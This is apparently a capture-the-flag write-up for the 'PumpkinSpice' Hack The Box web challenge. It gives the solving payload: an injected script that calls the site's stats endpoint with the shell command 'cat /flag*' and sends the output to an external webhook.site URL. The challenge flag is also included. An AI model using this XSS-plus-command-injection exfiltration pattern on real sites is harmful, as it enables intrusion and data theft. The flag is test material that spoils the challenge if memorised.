# Description

PumpkinSpice
In the eerie realm of cyberspace, a shadowy hacker collective known as the "Phantom Pumpkin Patch" has unearthed a sinister Halloween-themed website, guarded by a devious vulnerability. As the moon casts an ominous glow, their cloaked figures gather around the flickering screens, munching on pickles, ready to exploit this spectral weakness.

# Source:

- [Source](./src/)
- [Zip](./web_pumpkinspice.zip)

# Solve

- Payload:
```html
<script>fetch('/api/stats?command=cat%20/flag*')
.then(data=>data.text())
.then(data=>fetch(`https://webhook.site/2d801f2b-8074-4cf5-bea6-b7d949f70598?a=${data}`));</script>
```

`Flag: HTB{th3_tr34t_m1s5i0n}`